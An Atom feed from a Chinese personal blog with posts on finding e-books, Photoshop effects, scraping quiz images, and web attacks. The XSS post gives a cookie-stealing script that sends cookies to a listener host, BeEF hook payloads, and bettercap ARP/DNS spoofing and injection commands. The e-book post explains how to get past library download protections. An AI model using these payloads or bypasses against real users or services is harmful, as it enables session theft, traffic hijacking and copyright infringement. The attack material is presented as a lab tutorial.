<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://blownscarerow.github.io/</id>
    <title>我没有失眠啊i</title>
    <updated>2020-11-03T14:30:03.857Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://blownscarerow.github.io/"/>
    <link rel="self" href="https://blownscarerow.github.io/atom.xml"/>
    <logo>https://blownscarerow.github.io/images/avatar.png</logo>
    <icon>https://blownscarerow.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 我没有失眠啊i</rights>
    <entry>
        <title type="html"><![CDATA[如何找到心仪的电子书]]></title>
        <id>https://blownscarerow.github.io/post/ru-he-zhao-dao-xin-yi-de-dian-zi-shu/</id>
        <link href="https://blownscarerow.github.io/post/ru-he-zhao-dao-xin-yi-de-dian-zi-shu/">
        </link>
        <updated>2020-11-03T13:59:22.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>​	一些感想：10.31日，继度盘搜最好用的网盘搜索引擎——云盘精灵因为版权等相关问题闭站，百度网盘也调整了侵权内容的界定——转存次数几百次的东西就算违规，在知识付费，知识产权保护的大背景下，网盘搜索似乎走到了尽头（剩下的都是些没用的了，估计不久也会关站），资源的获取将会越来越难，知识的不对称，不平等性也会提高……还是趁着现在还能白嫖的时候多学学东西吧。由于许多小伙伴广泛爱好看书，这次谈谈如何找书，其实我们要找的书是唯一的东西，出版社和作者（译者）版次是固定的，电子书也就固定了，所以问题就变成了如何在网络中找到一个唯一确定的东西。那些畅销书还比较好找，但是专业书就比较难了。</p>
</blockquote>
<h2 id="一-常用的电子书的格式">一、常用的电子书的格式</h2>
<ul>
<li>PDF：微软的整的格式，通用性极强，流行性最广，分为图片pdf和矢量pdf，对设备依赖性较少，支持kindle，但阅读体验较差。</li>
<li>epub：可做到精美排版，通用性最强，可在手机QQ、微信、微信读书、苹果“图书”等众多app打开（手机QQ和微信支持度较差），但是epub格式不支持kindle。</li>
<li>azw3：亚马逊整出来的格式，和epub类似，可做到精美排版，通用性差点，azw3格式支持kindle阅读，不支持kindle邮箱推送。</li>
<li>mobi：排版简单，只是目录跳转、图片、文字三方面的简单组合，占用空间较大，mobi格式支持kindle阅读，也支持kindle邮箱推送。</li>
</ul>
<h2 id="二-常见的搜索方法">二、常见的搜索方法</h2>
<h3 id="1搜索引擎搜索">1.搜索引擎搜索</h3>
<p>这里指的搜索引擎指的是百度和谷歌。（不推荐这种方法）</p>
<h4 id="a百度">a.百度</h4>
<p>由于近几年国家对盗版书籍网站的打击，基本上百度能直接搜索到的资源很少很少，基本上seo做得好的都关站了。</p>
<p>这里介绍两种种搜索方法  即</p>
<p><mark>书名+filetype :pdf</mark>  例如 世界民族与宗教 丁金光 filetype:pdf 这里是用的谷歌语法： 文件名 + filetype 会强制指定文件类型，</p>
<p><mark>书名 + 提取码</mark> 例如 世界民族与宗教 提取码</p>
<h4 id="b谷歌">b.谷歌</h4>
<p>如果你能科学上网的话，谷歌是一个较好的搜索引擎，但是只能说找到的东西比百度稍微多一点，大部分都是钓鱼，诱导二次付费的。效果没有像网上传的那样谷歌是最好的搜索书的平台。</p>
<img src="http://image.scorner.cn/qiniulmg/20201101223417.png" alt="image-20201101223408909" style="zoom:100%;float:left" />
<h3 id="2网盘搜索微盘">2.网盘搜索（微盘）</h3>
<p>现在最大的网盘就是百度云盘了，百度云盘占据了绝对的市场，虽然蓝奏、文叔叔、阿里、天翼等以不限速的优势异军突起，但是百度网盘起步早，主要的资源都分享在百度网盘里；微盘主要是新浪微盘（由于国家大力整治版权，现在已经没落，暂且不提）。</p>
<p>而云盘搜索引擎就等于说人为的爬取一些网站、论坛的网盘资源然后可以直接用云盘搜索引擎搜索到，还有一些用户自己上传整理的资源。云盘精灵倒了，哭腔（</p>
<p>这里推荐两个网盘搜索引擎（别的公众号啥的会给你推荐很多，其实大部分都是垃圾）</p>
<h5 id="a鸠摩搜书"><a href="!%5B%5D(http://image.scorner.cn/qiniulmg/20201103192533.png)">a.鸠摩搜书</a></h5>
<img src="http://image.scorner.cn/qiniulmg/20201103193004.png" alt="image-20201103193002683" style="zoom: 50%;float:left" />
<p>有一说一，功能很强大，适合直接搜索使用，唯一的缺点就是书还是不全，但是已经是最好的，完全可以替代其他的云盘搜书的，多的不介绍，用了都说好。</p>
<h5 id="b小鸟盘"><a href="https://www.birdiesearch.com/">b.小鸟盘</a></h5>
<img src="http://image.scorner.cn/qiniulmg/20201103193416.png" alt="image-20201103193414510" style="zoom: 40%;float:left" />
<p>这是继度盘搜以后个人觉得最好用的云盘搜索引擎，可以搜到大部分你想要的资源，付费网课，电影啥的，书籍相对较少，但是有时候有奇效，哈哈，唯一不好的地方就是需要付费（免费的一天只有几次搜索次数），是一个小众的宝藏网盘搜索引擎。</p>
<h3 id="3专业的书籍网站">3.专业的书籍网站</h3>
<h5 id="aepubee">a.<a href="http://cn.epubee.com/books/">ePuBee</a></h5>
<img src="http://image.scorner.cn/qiniulmg/20201103194320.png" alt="image-20201103194319008" style="zoom: 50%;float:left" />
<p>这是目前所只得最大的书库，里面书都是那些epub、azw3、mobi格式的书,文字可编辑复制，适合kindle、平板等阅读，基本上kindle书城有的书这里都有（好像大部分书都是来源于那里哈哈）而不必麻烦的解除kindle书城的DRM加密。唯一的缺点还是付费，不过相对来说已经很良心了。</p>
<h5 id="b汇雅"><a href="http://www.sslibrary.com/">b.汇雅</a></h5>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20201103195252.png" alt="image-20201103195250835" loading="lazy"></figure>
<p>这里号称百万图书任你读，书目还比较多（其实也挺少的哈哈）。在有校园网（或者学校vpn）的情况下这里的书可以在线阅读。</p>
<p>这个网站的漏洞还挺多的，下载方法也比较简单（这里指的下载不是用超星阅读下载，因为用那个下载完了书是加密的,限制比较多）</p>
<h6 id="1idm拦截">1.idm拦截</h6>
<p>idm是一款超级好用的下载工具，可以下载网页上的视频等，不了解的可以看看这个 <a href="https://www.bilibili.com/video/BV1q4411t71E?from=search&amp;seid=12172960224884225196">传送门</a></p>
<p>用idm设置可以拦截网页pdf，之后打开</p>
<img src="http://image.scorner.cn/qiniulmg/20201103195847.png" style="zoom: 50%;" />
<img src="http://image.scorner.cn/qiniulmg/20201103200339.png" alt="image-20201103200336934" style="zoom: 50%; float: left;" />
<p>这样idm便拦截了网页的pdf.js 从而网页无法载入书籍 ，而我们也得到了书籍的地址</p>
<p>https://pdfssj.sslibrary.com/download/getFile?fileMark=96163209&amp;userMark=&amp;pages=186&amp;time=1604404828620&amp;enc=41463882445821ccd10e01b5febf8f10&amp;code=86e110eb7a5c3dced183ee5072a6f1d4&amp;cpage=1</p>
<p>其中最后的参数cpage=1为页面的参数，可以用idm批量下载</p>
<img src="http://image.scorner.cn/qiniulmg/20201103200952.png" alt="image-20201103200950675" style="zoom:50%;" />
<p>最后再用合并软件合并即可</p>
<p>但是还是比较麻烦</p>
<h6 id="2这里打包了一个下载汇雅的软件">2.这里打包了一个下载汇雅的软件</h6>
<p>下载地址：<a href="https://thegai.lanzoux.com/iTSNvi0ye3e">传送门</a></p>
<img src="http://image.scorner.cn/qiniulmg/20201103201100.png" alt="image-20201103201058855" style="zoom: 67%;" />
<p>在有校园网的情况下，直接打开下载傻瓜式操作，最终会合并成一个pdf文件</p>
<h5 id="c原创力文档"><a href="https://max.book118.com/">c.原创力文档</a></h5>
<img src="http://image.scorner.cn/qiniulmg/20201103201557.png" alt="image-20201103201556804" style="zoom:50%;" />
<p>这是一个用户上传文档可以挣钱的网站，当然又会有很多用户上传电子书啦</p>
<img src="http://image.scorner.cn/qiniulmg/20201103201900.png" alt="image-20201103201859028" style="zoom:50%;" />
<p>虽然文件被系统侦探为侵权，但是冰点还是可以下载，说明文件并没有在站内完全删除</p>
<p>冰点下载器 <a href="https://wwa.lanzous.com/i4izbf4ofeh">传送门</a></p>
<p>冰点不仅可以下载原创力，还可以下载百度文库，豆丁等文库的东西，功能强大，非常推荐</p>
<img src="http://image.scorner.cn/qiniulmg/20201103202237.png" alt="image-20201103202235966" style="zoom: 50%;" />
<h5 id="d全国图书馆参考联盟"><a href="http://www.ucdrs.superlib.net/">d.全国图书馆参考联盟</a></h5>
<p>这个网站可以查所有有电子版扫面过的书</p>
<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20201103202647.png" alt="" loading="lazy"></figure>
<p>一般有试读的都可以文献传递，注册登陆账号以后电子文献传递，一般一次只可以传递50页，书会发送到你的邮箱，短时间内不会获得全本，但是比较方便，操作比较简单。如果连这上面都没有图书的试读，那你基本可以放弃寻找了，估计万能的淘宝上也不会有，那这里面的书都是哪里来的呢，其实大部分都是超星（就是我们用的那个学习通）他把各个图书馆扫描的书统一起来，每本书有唯一的ss号，这里附一个油猴脚本的链接显示ssid，后面会用到，<a href="https://greasyfork.org/zh-CN/scripts/394972-%E8%AF%BB%E7%A7%80%E6%90%9C%E7%B4%A2%E9%A1%B5%E6%98%BE%E7%A4%BAssid">传送门</a></p>
<p>关于油猴脚本的安装，介绍，<a href="https://www.bilibili.com/video/BV1bQ4y1M7a1?from=search&amp;seid=2673036446460251086">传送门</a> 只能说油猴脚本永远的神，看视频、刷网课、网页接触限制啥的体验感爆棚</p>
<figure data-type="image" tabindex="3"><img src="http://image.scorner.cn/qiniulmg/20201103205654.png" alt="image-20201103205654144" loading="lazy"></figure>
<p>其实上面提到的汇雅和下面提到的读秀其实都是它的一个分支，以前漏洞比较多被人爬过库，当然现在还有大图算法，一般淘宝咸鱼代下的话基本上都是买了书库或者用书库做成的软件，350w本书的价格大概是800元。</p>
<figure data-type="image" tabindex="4"><img src="http://image.scorner.cn/qiniulmg/20201103202759.png" alt="image-20201103202757904" loading="lazy"></figure>
<h5 id="e读秀"><a href="http://www.duxiu.com/">e.读秀</a></h5>
<p>这个是我最喜欢的也是最方便的下书的地方，这里介绍的是包库下载的方法</p>
<figure data-type="image" tabindex="5"><img src="http://image.scorner.cn/qiniulmg/20201103204145.png" alt="image-20201103204144507" loading="lazy"></figure>
<p>只要有包库全文的都可以用这种方法下载，包库书籍的数量跟图书馆购买的书量有关</p>
<figure data-type="image" tabindex="6"><img src="http://image.scorner.cn/qiniulmg/20201103204535.png" alt="image-20201103204534617" loading="lazy"></figure>
<p>这里用到的工具会比较多，思路如下</p>
<p>嗅探到真实的地址，下载，合并</p>
<p>期间要用超星的客户端作为阅读工具，通过抓包客户端构建报文</p>
<h6 id="1阅读器">1.阅读器</h6>
<p>超星阅读器，用阅读器打开包库</p>
<figure data-type="image" tabindex="7"><img src="http://image.scorner.cn/qiniulmg/20201103210415.gif" alt="测试1" loading="lazy"></figure>
<h6 id="2嗅探工具">2.嗅探工具</h6>
<p>打开嗅探工具操作开始选择一个正在进行的进程选定超星阅读器</p>
<p>然后阅读器进行翻页，这样就获取了请求头</p>
<figure data-type="image" tabindex="8"><img src="http://image.scorner.cn/qiniulmg/20201103211136.gif" alt="测试2" loading="lazy"></figure>
<h6 id="3棒棒糖下载工具">3.棒棒糖下载工具</h6>
<p>自动创建然后复制请求头，它会获取信息自动下载的，下下载为加密的pdg格式</p>
<figure data-type="image" tabindex="9"><img src="http://image.scorner.cn/qiniulmg/20201103212155.gif" alt="测试3" loading="lazy"></figure>
<h6 id="4合并工具">4.合并工具</h6>
<p>老马的工具可以把加密的pdg合并成pdf</p>
<p>这里我把书签都删除了正常来说应该是直接有书签</p>
<figure data-type="image" tabindex="10"><img src="http://image.scorner.cn/qiniulmg/20201103214758.gif" alt="测试4" loading="lazy"></figure>
<h6 id="5书签获取">5.书签获取</h6>
<p>部分书籍可能书签下载有问题</p>
<p>把油猴脚本显示的ssid输入软件上</p>
<figure data-type="image" tabindex="11"><img src="http://image.scorner.cn/qiniulmg/20201103215002.png" alt="image-20201103215001112" loading="lazy"></figure>
<h6 id="6编辑书签">6.编辑书签</h6>
<p>打开书签编辑器打开软件复制上去，这面便获得一本带书签完整的书</p>
<img src="http://image.scorner.cn/qiniulmg/20201103215444.gif" alt="测试5" style="zoom:50%;" />
<figure data-type="image" tabindex="12"><img src="http://image.scorner.cn/qiniulmg/20201103215555.png" alt="image-20201103215549353" loading="lazy"></figure>
<p>所用到工具的链接 <a href="https://thegai.lanzoux.com/i0MwJi135da">传送门</a></p>
<h3 id="三-小结">三、小结</h3>
<p>其实找一本书还是比较费劲的，特别是后面这样做书，有些书还要找大学图书馆账号找包库，随着知识产权保护的不断深入，漏洞的不断修复，会越来越难。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RSA算法实战]]></title>
        <id>https://blownscarerow.github.io/post/rsa-suan-fa-shi/</id>
        <link href="https://blownscarerow.github.io/post/rsa-suan-fa-shi/">
        </link>
        <updated>2020-09-29T13:42:54.000Z</updated>
        <content type="html"><![CDATA[<h4 id="1抓包分析">1.抓包分析</h4>
<p>网址 <strong>http://login.wsgjp.com.cn/</strong></p>
<p>以网上管家婆为例，公司名账号名密码全部aaaa</p>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200929205039.png" alt="image-20200929205031550" loading="lazy"></figure>
<p>抓包分析，在login包中</p>
<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20200929205429.png" alt="image-20200929205427975" loading="lazy"></figure>
<p>userName，password均被加密处理</p>
<h4 id="2js逆向定位">2.js逆向定位</h4>
<p>搜索username</p>
<p><img src="http://image.scorner.cn/qiniulmg/20200929205845.png" alt="image-20200929205844291" loading="lazy">定位到这里，下断点试试，在这里断住说明这里就是加密所需的</p>
<figure data-type="image" tabindex="3"><img src="http://image.scorner.cn/qiniulmg/20200929210000.png" alt="image-20200929205958616" loading="lazy"></figure>
<p><code>var key = new RSAKeyPair()</code> 说明加密方式为RSA加密</p>
<h4 id="3逆向写js">3.逆向写js</h4>
<p>关键代码，将RSA.js 和加密算法导入得</p>
<figure data-type="image" tabindex="4"><img src="http://image.scorner.cn/qiniulmg/20200929211856.png" alt="image-20200929211854630" loading="lazy"></figure>
<p>运行以后发现 setMaxDigits未定义</p>
<p>发现在biglnt中导入得</p>
<figure data-type="image" tabindex="5"><img src="http://image.scorner.cn/qiniulmg/20200929212153.png" alt="image-20200929212124824" loading="lazy"></figure>
<img src="http://image.scorner.cn/qiniulmg/20200929212250.png" alt="image-20200929212249033" style="zoom:200%;float:left" />
<p>发现BarrettMu 未定义，搜索导入便得到了加密的结果</p>
<figure data-type="image" tabindex="6"><img src="http://image.scorner.cn/qiniulmg/20200929212426.png" alt="image-20200929212424933" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="http://image.scorner.cn/qiniulmg/20200929212454.png" alt="image-20200929212453267" loading="lazy"></figure>
<p>这样便得到了用户名加密的过程，可以用python和易语言做逆向登录使用</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[拍一拍内容自定义（恶搞）]]></title>
        <id>https://blownscarerow.github.io/post/pai-yi-pai-nei-rong-zi-ding-yi-e-gao/</id>
        <link href="https://blownscarerow.github.io/post/pai-yi-pai-nei-rong-zi-ding-yi-e-gao/">
        </link>
        <updated>2020-06-23T10:20:52.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>微信最新版本的一个隐藏“彩蛋”功能如果尝试双击好友或者群聊人员的头像消息界面会出现“拍了拍某某”的提示并且手机会配合头像晃动轻微震动一下</p>
</blockquote>
<p>被网友玩出了花</p>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200623171952.jpg" alt="v2-c9702ec9d799dc299408dafa02dc9588_720w" loading="lazy"></figure>
<p>但是拍一拍的格式相当固定，“昵称A” 拍了拍“昵称B” ，上图为网友进行互动，多人进行配合完成的截图</p>
<p>下面介绍一种可以独立完成的自定义恶搞拍了拍</p>
<p>以下为微信漏洞，暂未修复</p>
<p>因为微信个人信息中的昵称暂时无法设置此特殊字符，所以在群聊中使用</p>
<p>将群昵称改为以下格式</p>
<pre><code class="language-html">ﺮ后缀ﺮ别人看到的称呼
</code></pre>
<p>在群聊测试</p>
<p>将群昵称改为，如下图</p>
<pre><code class="language-js">ﺮ狗头ﺮ小盖
</code></pre>
<img src="http://image.scorner.cn/qiniulmg/20200623183113.jpg" alt="QQ图片20200623183056" style="zoom:50%;" />
<p>本人显示正常</p>
<img src="http://image.scorner.cn/qiniulmg/20200623180740.jpg" alt="img" style="zoom:50%;" />
<p>但是对方和其他群成员显示</p>
<img src="http://image.scorner.cn/qiniulmg/20200623180812.jpg" alt="img" style="zoom:50%;" />
<p>注意：</p>
<p><mark>如果有私人备注的话可能会影响效果</mark></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PS动漫风学习]]></title>
        <id>https://blownscarerow.github.io/post/ps-dong-man-feng/</id>
        <link href="https://blownscarerow.github.io/post/ps-dong-man-feng/">
        </link>
        <updated>2020-06-23T04:30:18.000Z</updated>
        <content type="html"><![CDATA[<h4 id="一-二次元图片特征">一、二次元图片特征</h4>
<img src="http://image.scorner.cn/qiniulmg/20200623085133.jpg" alt="你的名字1080P高清壁纸 (2)" style="zoom: 33%;" />
<ul>
<li>对比度相对不高</li>
<li>暗部区没有死角</li>
<li>绿色，蓝色占比较高</li>
</ul>
<h4 id="二-步骤实现">二、步骤实现</h4>
<p>本文使用图片</p>
<img src="http://image.scorner.cn/qiniulmg/20200623093036.png" alt="原图01(小尺寸)" style="zoom: 33%;" />
<h5 id="1-ps滤镜库">1、PS滤镜库</h5>
<p>干画笔油画滤镜使得图片感觉不那么真实， 具体数值需要长时间进行调试。这里就直接用调试好的数值。</p>
<img src="http://image.scorner.cn/qiniulmg/20200623102531.gif" alt="测试2" style="zoom: 33%;" />
<h5 id="2-cameraraw调色">2、CameraRAW调色</h5>
<p>降低对比度、提高阴影，增强饱和度、锐化、蒙版、增加绿色等，进行图片调色</p>
<img src="http://image.scorner.cn/qiniulmg/20200623104715.gif" alt="测试" style="zoom: 33%;" />
<h5 id="3-替换天空">3、替换天空</h5>
<p>扣掉原图天空，替换素材</p>
<p>快速选择工具选择天空删除，换上动漫图片的天空，再对天空的细节进行进一步整理</p>
<img src="http://image.scorner.cn/qiniulmg/20200623111130.gif" alt="测试1" style="zoom: 33%;" />
<p>对天空进行微调后，最后曲调整画面统一度，换天就完成了</p>
<img src="http://image.scorner.cn/qiniulmg/20200623113117.gif" alt="测试2" style="zoom: 33%;" />
<h5 id="4-水面倒影制">4、水面倒影制</h5>
<p>复制图层，倒置添加蒙版后用渐变工具实现水面倒影</p>
<img src="http://image.scorner.cn/qiniulmg/20200623115122.gif" alt="测试3" style="zoom:40%;" />
<p>利用蒙版黑遮白显的特征，用画笔工具对蒙版进行微调，这样水面倒影就制作好了</p>
<img src="http://image.scorner.cn/qiniulmg/20200623115420.png" alt="image-20200623115417698" style="zoom: 50%;" />
<h5 id="5-光晕制作">5、光晕制作</h5>
<p>新建图层，填充黑色并转换为智能对象（对镜头进行调整），添加镜头光晕，混合模式改为滤色</p>
<img src="http://image.scorner.cn/qiniulmg/20200623120458.gif" alt="测试4" style="zoom: 40%;" />
<h5 id="6-效果预览">6、效果预览</h5>
<img src="http://image.scorner.cn/qiniulmg/20200623120728.png" alt="结果" style="zoom:40%;" />
<h4 id="三-相关素材">三、相关素材</h4>
<pre><code class="language-html">https://thegai.lanzous.com/iAveRdymtve
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSS漏洞]]></title>
        <id>https://blownscarerow.github.io/post/xss-lou-dong/</id>
        <link href="https://blownscarerow.github.io/post/xss-lou-dong/">
        </link>
        <updated>2020-06-21T23:07:12.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
</blockquote>
<h4 id="一-xss攻击的类型">一、XSS攻击的类型</h4>
<p>​	1.存储型（持久性跨站脚本）：跨站代码存储在服务器（数据库）特点是：长期存储在服务器端，每次用户访问都会被执行js代码</p>
<p>​	2.反射型（非持久性跨站脚本）：用户访问服务器—跨站链接—返回跨站源码，通过社工方式将带有js脚本的链接发给受害者</p>
<p>​	3.DOM型：文档对象模型，本质上也是反射型</p>
<h4 id="二-具体分析">二、具体分析</h4>
<h5 id="1将dvwa的安全性调到低">1.将DVWA的安全性调到低</h5>
<img src="http://image.scorner.cn/qiniulmg/20200621173958.png" alt="image-20200621173943309" style="zoom:100%;float:left" />
<h5 id="2存储型xss">2.存储型XSS</h5>
<p>输入js代码，到存储型测试中，出现弹窗说明该网站存在xss漏洞,可以被注入js脚本，且脚本已经被注入到网站中，每次刷新都会执行js代码</p>
<img src="http://image.scorner.cn/qiniulmg/20200621174056.png" alt="image-20200621174054726" style="zoom: 100%; float: left;" />
<img src="http://image.scorner.cn/qiniulmg/20200621174202.png" alt="image-20200621174150273" style="zoom:100%;" />
<h5 id="3xss-dom型漏洞发送cookie">3.XSS DOM型漏洞—发送Cookie</h5>
<h6 id="akali启用ncat监听81端口">a.kali启用ncat监听81端口</h6>
<img src="http://image.scorner.cn/qiniulmg/20200621180110.png" alt="image-20200621180107514" style="zoom:100%;" />
<h6 id="b插入js代码-定义图片返回cookie">b.插入JS代码。定义图片，返回cookie</h6>
<pre><code class="language-js">&lt;script&gt; var img = document.createElement('img');
img.src = 'http://192.168.0.105：81/log？' + escape(document.cookie); &lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200621185021.gif" alt="测试3" loading="lazy"></figure>
<p>这样我们便返回了当前页面的cookie，且每次加载页面都会返回一次cookie，获得了cookie等于获取了账号的使用权</p>
<h4 id="三-web框架攻击平台beff">三、Web框架攻击平台BeFF</h4>
<h5 id="1基本介绍">1.基本介绍</h5>
<h6 id="a简介">a.简介</h6>
<p>​	是目前欧美最流行的web框架攻击平台</p>
<h6 id="b特点">b.特点</h6>
<ul>
<li>一款针对游览器的渗透测试工具</li>
<li>实现对XSS漏洞的攻击和利用</li>
<li>Ruby语言编写</li>
<li>目标主机每隔一段时间会向BeFF服务器发送一个请求，询问是否有新的代码需要执行</li>
</ul>
<h6 id="c常用功能">c.常用功能</h6>
<ul>
<li>键盘记录记录器</li>
<li>网络扫描</li>
<li>游览器信息收集</li>
<li>绑定shell</li>
<li>与MSF集成等</li>
</ul>
<h5 id="2beef的使用">2.beef的使用</h5>
<h6 id="a启动beef">a.启动beef</h6>
<img src="http://image.scorner.cn/qiniulmg/20200622071053.png" alt="image-20200621190615820" style="zoom:100%;" />
<p>其中payload为</p>
<pre><code class="language-js">&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>其中beef后台网址为</p>
<pre><code class="language-html">http://127.0.0.1:3000/ui/panal
</code></pre>
<h6 id="b快速演示">b.快速演示</h6>
<p>受害者进入beef的钩子页面或者将payload注入带有XSS漏洞的网页中,beef后台立刻挂钩</p>
<pre><code class="language-html">http://192.168.0.105:3000/demos/basic.html
</code></pre>
<figure data-type="image" tabindex="2"><img src="http://image.scorner.cn/qiniulmg/20200621192126.png" alt="image-20200621192124458" loading="lazy"></figure>
<h6 id="c模块说明">c.模块说明</h6>
<p>Detail:游览器，插件版本</p>
<figure data-type="image" tabindex="3"><img src="http://image.scorner.cn/qiniulmg/20200621193609.png" alt="image-20200621193607900" loading="lazy"></figure>
<p>logs 记录键盘和鼠标操作 ，如被害者在网页输入hello word 攻击者便获取了键盘的输入记录 和点击</p>
<img src="http://image.scorner.cn/qiniulmg/20200621192342.png" alt="image-20200621192340767" style="zoom:80%;" />
<p>​	Commands：</p>
<p>​		绿色：适合目标游览器，执行结果用户不可见</p>
<p>​		红色：不适合</p>
<p>​		橙色：适合，但结果对用户可见</p>
<p>​		灰色：未测试</p>
<figure data-type="image" tabindex="4"><img src="http://image.scorner.cn/qiniulmg/20200621193128.png" alt="image-20200621193126903" loading="lazy"></figure>
<p>可以获取用户的cookie，打开用户的摄像头等，定位用户的位置等等，伪造flash更新等，功能之多，难以想象</p>
<figure data-type="image" tabindex="5"><img src="http://image.scorner.cn/qiniulmg/20200621194722.png" alt="image-20200621194721372" loading="lazy"></figure>
<h4 id="四-bettercap-beff中间人攻击">四、Bettercap + BeFF中间人攻击</h4>
<h5 id="1bettercap进行dns欺骗">1.bettercap进行dns欺骗</h5>
<p><mark>注意dns服务器需设置成网关</mark></p>
<pre><code class="language-js">set arp.spoof.targets 192.168.0.104 # 受害人ip
arp.spoof on

set dns.spoof.domains www.sina.com  #设置要欺骗的域名
set dns.spoof.address 192.168.0.105 # 将域名转换成攻击者ip
dns.spoof on
</code></pre>
<p>这样当受害者访问的时候，便被劫持到了攻击者的ip</p>
<figure data-type="image" tabindex="6"><img src="http://image.scorner.cn/qiniulmg/20200622065505.png" alt="image-20200622060429209" loading="lazy"></figure>
<h5 id="2bettercap配合beef">2.bettercap配合beef</h5>
<pre><code class="language-js">set dns.spoof.domains m.baidu.com # 设置欺骗的域名
set dns.spoof.address 192.168.0.105  # 设置攻击者ip
dns.spoof on

set arp.spoof.targets 192.168.0.104 # 受害者ip
set http.proxy.script /root/eval.js # 恶意js代码
set http.proxy.sslstrip true  
http.proxy on
arp.spoof on
</code></pre>
<figure data-type="image" tabindex="7"><img src="http://image.scorner.cn/qiniulmg/20200621222614.png" alt="image-20200621222612769" loading="lazy"></figure>
<p>eval.js文件配置</p>
<pre><code class="language-js">function onLoad(){
	log(&quot;BeefInject loaded.&quot;);
	log(&quot;targets: &quot; + env['arp.spoof.targets']);
}

function onResponse(req,res){
    if(res.ContentType.indexOf('text/html')==0){
        var body=res.ReadBody();
        if(body.indexOf('&lt;/head&gt;')!=-1){
            res.Body=body.replace(
                '&lt;/head&gt;',
               '&lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.0.105:3000/hook.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;'
            );
            }
        }
}
</code></pre>
<p>当受害者电脑访问m.baidu时候，跟往常一样，但是检查网页源码的时候却发现，百度已经被注入js文件了</p>
<img src="http://image.scorner.cn/qiniulmg/20200622065832.png" alt="QQ图片20200622065747" style="zoom: 67%;" />
<img src="http://image.scorner.cn/qiniulmg/20200622065947.png" alt="QQ图片20200622065759" style="zoom: 67%;" />
<p>在后台，bettercap工作日志</p>
<figure data-type="image" tabindex="8"><img src="http://image.scorner.cn/qiniulmg/20200622070038.png" alt="QQ图片20200622065753" loading="lazy"></figure>
<p>此游览器已经被控制</p>
<figure data-type="image" tabindex="9"><img src="http://image.scorner.cn/qiniulmg/20200622070210.png" alt="QQ图片20200622065805" loading="lazy"></figure>
<h4 id="五-经验">五、经验</h4>
<p><mark>少看那些不安全的网站，屏幕另一边的他不一定正在对你做什么勾当</mark>🙏</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[雨课堂试题]]></title>
        <id>https://blownscarerow.github.io/post/yu-ke-tang-shi-ti-zheng-li/</id>
        <link href="https://blownscarerow.github.io/post/yu-ke-tang-shi-ti-zheng-li/">
        </link>
        <updated>2020-06-21T03:35:13.000Z</updated>
        <content type="html"><![CDATA[<p>雨课堂经常做随堂测试，但是每个题都是图片形式的，复习起来很不方便。便萌发了整理的念头。</p>
<img src="http://image.scorner.cn/qiniulmg/20200621103235.png" alt="image-20200621103226678" style="zoom:50%;float:left" />
<h4 id="一-抓包分析">一、抓包分析</h4>
<img src="http://image.scorner.cn/qiniulmg/20200621115906.png" alt="image-20200621104244301" style="zoom: 67%;" />
<p>不得不说雨课堂是真的有钱，试题以图片的方式存储的，试题的图片从js返回，那么思路为获取图片所有的地址并且下载，再批量调用文字识别写即可。</p>
<h4 id="二-图片获取">二、图片获取</h4>
<h5 id="a图片和答案字典获取">a.图片和答案字典获取</h5>
<p>由于图片是js返回的，并且图片数量不多，用selenium便可以获取网页渲染完毕后的所有数据。</p>
<pre><code class="language-python">from selenium import webdriver
import time

driver = webdriver.Chrome()
url = 'https://www.yuketang.cn/v2/web/student/2998183/5729718/676687799'  # 随堂测试的地址
driver.get(url)
time.sleep(10)  # 停一会扫码登陆
driver.find_element_by_xpath('//*[@id=&quot;problem&quot;]/div/div/div[2]/div[2]/p').click()  # 点击使得所有图片都加载
ques_list = driver.find_elements_by_xpath('//*[@id=&quot;problem&quot;]/div/div/div[2]/div[1]/div/div/div') # 选择父节点
for que in ques_list:
    temp = {}
    temp['answer'] = que.find_element_by_xpath('div[2]/span[2]').text # 试题答案
    temp['pic'] = que.find_element_by_xpath('div[1]/img').get_attribute('src') #试题图片地址
    print(temp)
</code></pre>
<p>效果如下<br>
<img src="http://image.scorner.cn/qiniulmg/20200621110336.gif" alt="测试1" loading="lazy"></p>
<p>这样便获取了图片和答案的构成的字典</p>
<h5 id="b图片和答案分离">b.图片和答案分离</h5>
<pre><code class="language-python">import re
regex1 = '答案：[A-Z]+'
regex2 = 'https://.*\''
answer = re.findall(regex1, a) # a为刚才的字典
url = re.findall(regex2, a)  
url = [i[:-1] for i in url]
print(answer)
print(url)
</code></pre>
<p>得到了答案和图片地址的列表</p>
<figure data-type="image" tabindex="1"><img src="http://image.scorner.cn/qiniulmg/20200621121142.png" alt="image-20200621121139319" loading="lazy"></figure>
<h5 id="c图片下载">c.图片下载</h5>
<pre><code class="language-python">import requests
import time 
j = 1
for i in url:  # 下载
    res = requests.get(url=i, headers=headers).content
    time.sleep(0.5)
